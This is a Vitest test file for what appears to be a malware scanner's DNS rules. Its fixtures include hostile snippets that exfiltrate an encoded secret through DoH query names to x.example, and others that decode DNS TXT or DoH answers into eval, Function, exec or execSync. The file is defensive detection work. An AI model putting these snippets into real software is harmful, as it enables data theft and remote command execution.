import { performance } from "node:perf_hooks";
import { describe, expect, it } from "vitest";
import {
  ALL_PATTERN_SETS,
  isPatternApplicableToFile,
  matchPatternInContent,
  resolvePatternSeverity,
} from "../patterns.js";
import type { PatternEntry, Severity } from "../types.js";
import { performanceBudget } from "./performance-budget.js";

const shippedRule = (rule: string): PatternEntry => {
  const entry = ALL_PATTERN_SETS
    .flatMap(([, set]) => set)
    .find((candidate) => candidate.rule === rule);
  if (!entry) throw new Error(`Missing shipped rule: ${rule}`);
  return entry as PatternEntry;
};

/** What the scanner reports: one severity per hit, in hit order. */
function severities(rule: string, content: string, file = "src/dns-check.ts"): Severity[] {
  const entry = shippedRule(rule);
  if (!isPatternApplicableToFile(entry, content, file)) return [];
  return matchPatternInContent(entry, content, "g")
    .map((hit) => resolvePatternSeverity(entry, content, hit));
}

const DNSKEY_OVER_DOH = [
  "export async function dnskey(domain: string) {",
  '  const url = "https://dns.google/resolve?name=" + encodeURIComponent(domain) + "&type=DNSKEY";',
  '  const res = await fetch(url, { headers: { accept: "application/dns-json" } });',
  "  const body = await res.json();",
  '  const digest = createHash("sha256").update(body.Answer[0].data).digest().toString("hex");',
  "  return { body, digest };",
  "}",
].join("\n");

const SPF_LOOKUP = [
  'import { promises as dns } from "node:dns";',
  "export async function spf(domain: string) {",
  "  const records = await dns.resolveTxt(domain);",
  '  return records.map((r) => r.join("")).find((t) => /^v=spf1 /.exec(t));',
  "}",
].join("\n");

describe("C2_DOH_RESOLVER and DEAD_DROP_DNS_TXT need a C2 signal for medium", () => {
  it("reports a DNSKEY lookup over DoH with a caller-supplied domain below medium", () => {
    const found = severities("C2_DOH_RESOLVER", DNSKEY_OVER_DOH);
    expect(found.length).toBeGreaterThan(0);
    expect(found.every((severity) => severity === "low")).toBe(true);
  });

  it("reports a DNSKEY lookup over DoH with a constant domain below medium", () => {
    const content =
      'const r = await fetch("https://cloudflare-dns.com/dns-query?name=example.com&type=DNSKEY", { headers: { accept: "application/dns-json" } });';
    expect(severities("C2_DOH_RESOLVER", content)).toEqual(["low"]);
  });

  it("reports an SPF lookup via dns.resolveTxt below medium", () => {
    expect(severities("DEAD_DROP_DNS_TXT", SPF_LOOKUP)).toEqual(["low"]);
  });

  it("keeps a DKIM key decode next to RegExp.exec below medium", () => {
    const content = [
      "const [record] = await dns.resolveTxt(`${selector}._domainkey.${domain}`);",
      "const p = /p=([^;]+)/.exec(record.join(\"\"))?.[1] ?? \"\";",
      'const key = Buffer.from(p, "base64");',
    ].join("\n");
    expect(severities("DEAD_DROP_DNS_TXT", content)).toEqual(["low"]);
  });

  it("reports a DoH query name built from encoded data at medium", () => {
    const content =
      'fetch("https://dns.google/resolve?name=" + base32(secret) + ".x.example&type=TXT");';
    expect(severities("C2_DOH_RESOLVER", content)).toEqual(["medium"]);
  });

  it("reports a DoH query name encoded into a variable on the lines above at medium", () => {
    for (const encode of ["base32(secret)", 'Buffer.from(secret).toString("base64url")']) {
      const content = [
        `const encoded = ${encode};`,
        'const q = encoded + ".x.example";',
        'fetch("https://dns.google/resolve?name=" + q + "&type=TXT");',
      ].join("\n");
      expect(severities("C2_DOH_RESOLVER", content), encode).toEqual(["medium"]);
    }
  });

  it("does not reach an encoder more than five lines above the query", () => {
    const content = [
      "const encoded = base32(secret);",
      ..."abcdef".split("").map((v) => `const ${v} = 1;`),
      'fetch("https://dns.google/resolve?name=example.com&type=TXT");',
    ].join("\n");
    expect(severities("C2_DOH_RESOLVER", content)).toEqual(["low"]);
  });

  it("reports a TXT answer handed to an alias of Function at medium", () => {
    const content = [
      "dns.resolveTxt(d, (e, r) => {",
      '  const payload = Buffer.from(r[0][0], "base64").toString();',
      "  const F = Function;",
      "  F(payload)();",
      "});",
    ].join("\n");
    expect(severities("DEAD_DROP_DNS_TXT", content)).toEqual(["medium"]);
  });

  it("reports a TXT answer decoded into eval at medium", () => {
    const content =
      'dns.resolveTxt(d, (e, r) => eval(Buffer.from(r[0][0], "base64").toString()));';
    expect(severities("DEAD_DROP_DNS_TXT", content)).toEqual(["medium"]);
  });

  it("reports a DoH answer decoded into eval elsewhere in the file at medium", () => {
    const content = [
      'const res = await fetch(u, { headers: { accept: "application/dns-json" } });',
      "const j = await res.json();",
      "eval(atob(j.Answer[0].data));",
    ].join("\n");
    expect(severities("C2_DOH_RESOLVER", content)).toEqual(["medium"]);
  });

  it("reports a Python TXT query feeding exec of a decoded answer at medium", () => {
    const content = [
      "answer = resolver.query(domain, 'TXT')",
      "exec(base64.b64decode(str(answer[0])))",
    ].join("\n");
    expect(severities("DEAD_DROP_DNS_TXT", content, "pkg/setup.py")).toEqual(["medium"]);
  });

  it("reports a TXT answer handed to child_process at medium", () => {
    const content = [
      'const { execSync } = require("child_process");',
      'dns.resolveTxt(d, (e, r) => execSync(Buffer.from(r[0][0], "hex").toString()));',
    ].join("\n");
    expect(severities("DEAD_DROP_DNS_TXT", content)).toEqual(["medium"]);
  });

  it.each(["C2_DOH_RESOLVER", "DEAD_DROP_DNS_TXT"])(
    "%s names the signal it now requires in its description",
    (rule) => {
      const { description, severity } = shippedRule(rule);
      expect(severity).toBe("medium");
      expect(description).toMatch(/encod/i);
      expect(description).toMatch(/eval/);
      expect(description).toMatch(/child_process/);
      expect(description).toMatch(/\blow\b/);
    },
  );

  it("resolves severity linearly on a 5 MiB file", { timeout: performanceBudget(20_000) }, () => {
    const fiveMiB = 5 * 1024 * 1024;
    // Every line is a hit and a near miss for the decoder and encoder signals.
    const unit = 'dns.resolveTxt(d); Buffer.from(x, "b" + base32 + toString("he\n';
    const content = unit.repeat(Math.ceil(fiveMiB / unit.length)).slice(0, fiveMiB);
    const entry = shippedRule("DEAD_DROP_DNS_TXT");
    const hits = matchPatternInContent(entry, content, "g");
    expect(hits.length).toBeGreaterThan(1000);
    const started = performance.now();
    const resolved = hits.map((hit) => resolvePatternSeverity(entry, content, hit));
    expect(performance.now() - started).toBeLessThan(performanceBudget(5_000));
    expect(new Set(resolved)).toEqual(new Set(["low"]));
    // One very long line is scanned once for its single hit.
    const oneLine = `dns.resolveTxt(d); ${"base32 x ".repeat(fiveMiB / 9)}`;
    const longStarted = performance.now();
    expect(resolvePatternSeverity(entry, oneLine, { line: 1, text: "dns.resolveTxt" }))
      .toBe("low");
    expect(performance.now() - longStarted).toBeLessThan(performanceBudget(5_000));
  });
});
